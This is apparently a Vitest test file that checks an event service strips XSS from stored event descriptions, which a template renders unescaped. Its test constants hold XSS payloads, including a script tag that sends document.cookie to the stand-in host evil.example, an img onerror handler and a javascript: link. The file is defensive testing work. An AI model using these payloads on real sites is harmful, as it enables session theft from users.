import { describe, it, expect, vi, beforeEach } from "vitest";

// events-view.ejs renders the event description unescaped (<%- ev.description %>),
// so anything persisted by the service must already be sanitized.
const mockCreate = vi.fn();
const mockUpdate = vi.fn();
const mockFindFirst = vi.fn().mockResolvedValue(null);
const mockFindUnique = vi.fn();
const mockAuditCreate = vi.fn().mockResolvedValue({});

// Every model eventService touches needs a stub; the assertions only care
// about what lands in events.create / events.update.
const noopModel = () => ({
  create: vi.fn().mockResolvedValue({}),
  createMany: vi.fn().mockResolvedValue({ count: 0 }),
  update: vi.fn().mockResolvedValue({}),
  updateMany: vi.fn().mockResolvedValue({ count: 0 }),
  delete: vi.fn().mockResolvedValue({}),
  deleteMany: vi.fn().mockResolvedValue({ count: 0 }),
  findFirst: vi.fn().mockResolvedValue(null),
  findUnique: vi.fn().mockResolvedValue(null),
  findMany: vi.fn().mockResolvedValue([]),
});

vi.mock("../../controllers/databaseController.js", () => ({
  prisma: {
    events: {
      ...noopModel(),
      create: (...a) => mockCreate(...a),
      update: (...a) => mockUpdate(...a),
      findFirst: (...a) => mockFindFirst(...a),
      findUnique: (...a) => mockFindUnique(...a),
    },
    event_audit_logs: { ...noopModel(), create: (...a) => mockAuditCreate(...a) },
    event_actions: noopModel(),
    event_announcements: noopModel(),
    event_hosts: noopModel(),
    announcements: noopModel(),
    scheduledDiscordMessages: noopModel(),
  },
}));

const { createEvent, updateEvent } = await import("../../services/eventService.js");

const XSS = `<p>Join us!</p><script>fetch('https://evil.example/'+document.cookie)</script>`;
const IMG_ONERROR = `<img src=x onerror="alert(document.domain)">`;
const JS_HREF = `<a href="javascript:alert(1)">click</a>`;

const baseEvent = {
  title: "Build Contest",
  startAt: "2026-10-01T10:00:00Z",
  endAt: "2026-10-01T12:00:00Z",
};

function createdDescription() {
  return mockCreate.mock.calls[0][0].data.description;
}
function updatedDescription() {
  return mockUpdate.mock.calls[0][0].data.description;
}

describe("event description sanitization", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockCreate.mockResolvedValue({ eventId: 1, title: baseEvent.title });
    mockUpdate.mockResolvedValue({ eventId: 1, title: baseEvent.title });
    mockFindFirst.mockResolvedValue(null);
    // findUnique is used two different ways: generateSlug() probes by { slug }
    // and must eventually miss or it loops forever, while updateEvent() loads
    // the existing row by { eventId }.
    mockFindUnique.mockImplementation(async ({ where }) => {
      if (where?.slug !== undefined) return null;
      return {
        eventId: 1,
        title: baseEvent.title,
        slug: "build-contest",
        status: "draft",
        startAt: new Date(baseEvent.startAt),
      };
    });
  });

  describe("createEvent", () => {
    it("strips <script> from the description", async () => {
      await createEvent({ ...baseEvent, description: XSS }, 1, "tester");
      const stored = createdDescription();
      expect(stored).not.toContain("<script");
      expect(stored).not.toContain("evil.example");
      // legitimate formatting survives
      expect(stored).toContain("<p>Join us!</p>");
    });

    it("strips event-handler attributes", async () => {
      await createEvent({ ...baseEvent, description: IMG_ONERROR }, 1, "tester");
      expect(createdDescription()).not.toContain("onerror");
    });

    it("strips javascript: URLs", async () => {
      await createEvent({ ...baseEvent, description: JS_HREF }, 1, "tester");
      expect(createdDescription()).not.toContain("javascript:");
    });

    it("stores null for an absent description", async () => {
      await createEvent({ ...baseEvent }, 1, "tester");
      expect(createdDescription()).toBeNull();
    });
  });

  describe("updateEvent", () => {
    it("strips <script> on update", async () => {
      await updateEvent(1, { description: XSS }, 1, "tester");
      const stored = updatedDescription();
      expect(stored).not.toContain("<script");
      expect(stored).toContain("<p>Join us!</p>");
    });

    it("strips event-handler attributes on update", async () => {
      await updateEvent(1, { description: IMG_ONERROR }, 1, "tester");
      expect(updatedDescription()).not.toContain("onerror");
    });

    it("clears the description when set to an empty string", async () => {
      await updateEvent(1, { description: "" }, 1, "tester");
      expect(updatedDescription()).toBeNull();
    });

    it("leaves the description untouched when the field is not supplied", async () => {
      await updateEvent(1, { title: "Renamed" }, 1, "tester");
      expect(mockUpdate.mock.calls[0][0].data).not.toHaveProperty("description");
    });
  });
});
